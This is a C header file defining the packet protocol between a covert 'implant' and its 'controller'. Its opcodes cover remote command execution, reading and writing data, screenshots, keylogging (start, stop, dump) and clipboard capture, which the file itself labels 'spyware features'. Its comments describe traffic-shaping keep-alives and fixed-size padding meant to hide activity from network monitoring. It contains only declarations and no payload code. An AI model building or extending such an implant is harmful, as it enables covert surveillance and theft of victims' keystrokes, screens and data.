#ifndef PROTOCOL_H
#define PROTOCOL_H

#include "tls.h"    /* Conn* */

/*
 * Command opcodes — stored as a 4-byte int in the packet header.
 *
 * COMMAND_KEEPALIVE (9): sent by the implant at random intervals to blur the
 * traffic pattern between idle and active sessions (BP5 keep-alive shaping).
 * The controller silently discards these — they are never surfaced to the
 * operator.
 */
typedef enum
{
    COMMAND_HELLO       = 0,
    COMMAND_HEARTBEAT   = 1,
    COMMAND_SET_SLEEP   = 2,
    COMMAND_SHUTDOWN    = 3,
    COMMAND_READ_DATA   = 4,
    COMMAND_WRITE_DATA  = 5,
    COMMAND_RUN_CMD     = 6,
    COMMAND_ERROR       = 7,
    COMMAND_RESPONSE    = 8,
    COMMAND_KEEPALIVE   = 9,
    /* BP2: enrollment-on-first-contact */
    COMMAND_ENROLL_CSR  = 10,   /* implant → controller: PEM-encoded CSR */
    COMMAND_ENROLL_CERT = 11,   /* controller → implant: PEM-encoded signed cert */
    /* Spyware features */
    COMMAND_SCREENSHOT  = 12,
    COMMAND_KEYLOG_START = 13,
    COMMAND_KEYLOG_STOP  = 14,
    COMMAND_KEYLOG_DUMP  = 15,
    COMMAND_CLIPBOARD_GET = 16
} Command;

typedef struct
{
    Command  command_type;
    int      request_id;
    int      payload_len;
    char    *payload;   /* NULL when payload_len == 0 */
} Packet;

/*
 * Wire format (inside TLS record):
 *
 *   [4B command_type][4B request_id][4B payload_len]    ← 12-byte header
 *   [payload_len bytes of payload]
 *   [pad_bytes bytes of random padding]                  ← BP5
 *
 * pad_bytes = ((12 + payload_len) / 512 + 1) * 512 - (12 + payload_len)
 *
 * Both sides derive pad_bytes from payload_len so no extra field is needed.
 * Every packet on the wire is a multiple of 512 bytes, making command types
 * indistinguishable by ciphertext size.
 */

int     send_packet(Packet *packet, Conn *c);
Packet *recieve_packet(Conn *c);
void    free_packet(Packet *packet);
void    print_packet_contents(Packet *packet);

#endif /* PROTOCOL_H */
